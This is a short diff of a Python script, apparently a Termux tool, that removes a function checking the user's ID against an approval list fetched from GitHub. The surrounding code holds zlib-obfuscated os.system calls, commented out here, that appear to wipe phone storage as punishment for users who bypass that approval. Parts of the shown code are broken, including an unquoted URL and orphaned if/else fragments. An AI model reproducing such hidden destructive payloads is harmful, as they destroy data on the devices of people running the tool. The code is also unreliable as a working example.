@@ -164,16 +164,6 @@ def fucked():
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
 	print(' Fuck You Bypass User ');exit()
-
-def ckx():
-	uuid = str(os.geteuid()) + str(os.getlogin())
-	id = "→".join(uuid)
-	server = requests.get(https://raw.githubusercontent.com/Legharibadmshhai/Bewafaa/main/Approved.txt').text
-
-			pass
-		else:
-			msg = str(os.geteuid())
-			fucked()
 	except:
 			sys.exit()
 def Spy():
